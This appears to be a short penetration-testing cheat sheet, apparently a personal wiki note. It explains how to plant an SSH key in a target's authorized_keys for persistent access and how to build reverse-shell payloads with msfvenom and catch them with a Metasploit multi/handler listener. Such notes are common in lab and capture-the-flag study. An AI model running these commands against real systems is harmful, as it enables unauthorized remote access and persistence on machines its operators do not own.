## Using ssh
Actually requires only file writes, and the server to have an active ssh port.
You can run `whoami` to see the current user.
Append your public key to `~/.ssh/authorized_keys`.
If creating this file, run `chmod 600 ~/.ssh/authorized_keys`.
If the private key is in the `~/.ssh` directory (under the name `id_<type>`) on your machine, it will automatically use the private key for connection.
Alternatively you can use `-i <private key file path>` in the connection command.

Full sequence:
```bash
mkdir ~/.ssh
echo "your_ssh_public_key" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
To generate a new key, run `ssh-keygen`. It will by default place the private and public keys in `~/.ssh` (worth checking there for public key before generation).
## Using metasploit
Create a shell code using metasploit:
`msfvenom -p <payload> LHOST=<my ip> LPORT=4444`
example payload types:
- `php/meterpreter/reverse_tcp` - meterpreter, php code
- `linux/x64/meterpreter/reverse_tcp` - meterpreter, ELF file
- `python/meterpreter/reverse_tcp` - meterpreter, reverse tcp
- `cmd/unix/reverse_bash` - normal reverse shell, bash code
Listen using metasploit:
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD <exact path>
set LHOST <my ip>
set LPORT 4444
run
```
Now run the payload on the remote and wait.
Afterwards, you can [[Metasploit#Upgrading|upgrade the shell to meterpreter]] if it isn't already.